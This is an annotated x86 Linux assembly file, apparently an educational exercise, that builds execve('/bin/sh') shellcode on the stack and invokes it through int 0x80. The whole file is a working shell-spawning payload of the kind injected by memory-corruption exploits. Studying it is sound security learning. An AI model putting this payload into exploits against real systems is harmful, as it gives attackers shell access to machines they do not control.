; Filename: execve-sh_Stack.asm
; Author: Cameron, James
; Purpose: Demonstrate execve /bin/sh shellcode using Stack technique
; Tested On: Linux ubuntu 3.11.0-15-generic #25~precise1-Ubuntu SMP Thu Jan 30 17:42:40 UTC 2014 i686 i686 i386 GNU/Linux
;            Ubuntu 12.04.4 LTS



section .text

global _start

_start:
            ; int execve(const char *filename, char *const argv[],
            ;            char *const envp[]);
            ; #define __NR_execve              11

	xor eax, eax        ; set eax = 0
	
	; push /bin/shABBBBCCCC onto the stack

	push 0x43434343           ; CCCC
	mov dword [esp], eax      ; replace CCCC with nulls for envp and to null terminate argv
	mov edx, esp              ; set envp

	push 0x42424242           ; BBBB (location of argv)
	mov ecx, esp              ; set argv

	push 0x4168732f           ; Ahs/
	mov byte [esp + 3], al    ; null terminate /bin/sh
	push 0x6e69622f           ; nib/

	mov ebx, esp              ; mov /bin/sh into ebx (filename)
	mov dword [esp + 8], esp  ; replace BBBB with location of /bin/sh string (argv)
	mov al, 0xb               ; execve syscall
	int 0x80                  ; execute syscall
